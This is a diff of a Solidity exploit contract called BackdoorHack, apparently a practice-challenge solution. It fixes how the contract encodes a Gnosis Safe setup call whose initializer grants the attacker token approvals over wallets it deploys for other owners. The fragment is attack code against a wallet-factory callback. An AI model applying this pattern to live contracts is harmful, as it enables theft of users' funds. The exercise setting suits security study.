@@ -33,12 +33,16 @@ contract BackdoorHack {
         contractForApprove = ContractForApprove(_approveContract);
     }
 
-    function attack(address[] calldata owners) external payable {
+    function attack(address[] memory owners) external {
         // Call createProxyWithCallback to deploy a new GnosisSafeProxy on GnosisSafeProxyFactory
         // Create initializers for the GnosisSafeProxy
-        bytes memory approveData = abi.encodeWithSelector(contractForApprove.approveToken.selector, address(this), address(token));
+        // bytes memory approveData = abi.encodeWithSelector(ContractForApprove.approveToken.selector, address(this), address(token));
+        bytes memory approveData = abi.encodeCall(ContractForApprove.approveToken, (address(this), address(token)));
         for (uint256 i = 0; i < owners.length; i++) {
-            bytes memory initializer = abi.encodeWithSelector(GnosisSafe.setup.selector, owners[i], 1, address(contractForApprove), approveData, address(0), address(0), 0, address(0));
+            // bytes memory initializer = abi.encodeWithSelector(GnosisSafe.setup.selector, [owners[i]], 1, address(contractForApprove), approveData, address(0), address(0), 0, address(0));
+            address[] memory users = new address[](1);
+            users[0] = owners[i];
+            bytes memory initializer = abi.encodeCall(GnosisSafe.setup, (users, 1, address(contractForApprove), approveData, address(0), address(0), 0, payable(address(0))));
             uint256 saltNonce = i; // Any random salt
             GnosisSafeProxy proxy = GnosisSafeProxyFactory(walletFactoryAddress).createProxyWithCallback(
                 singleton,
